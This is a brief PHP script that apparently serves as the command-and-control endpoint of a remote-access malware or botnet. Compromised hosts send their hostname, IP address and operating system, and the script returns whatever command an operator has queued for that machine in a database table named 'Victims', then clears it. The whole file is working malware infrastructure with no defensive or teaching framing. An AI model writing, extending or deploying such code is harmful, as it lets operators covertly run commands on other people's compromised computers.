<?php
include 'conn.php';
//Get the comand from the sql server
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["hostname"]) && isset($_POST["ip"]) && isset($_POST["operatingsystem"])) {
    $commandQuery = $mysql->prepare("select command from Victims where hostname=? and ipaddress=? and operatingsystem=?");
    $commandQuery->bind_param("sss", $_POST["hostname"], $_POST["ip"], $_POST["operatingsystem"]);
    $commandQuery->execute();
    $commandQuery->store_result();
    $commandQuery->bind_result($command);
    $commandQuery->fetch();
    echo $command;
    $removeCommand = $mysql->prepare("update Victims set command='' where hostname=? and ipaddress=?");
    $removeCommand->bind_param("ss", $_POST["hostname"], $_POST["ip"]);
    $removeCommand->execute();


}



?>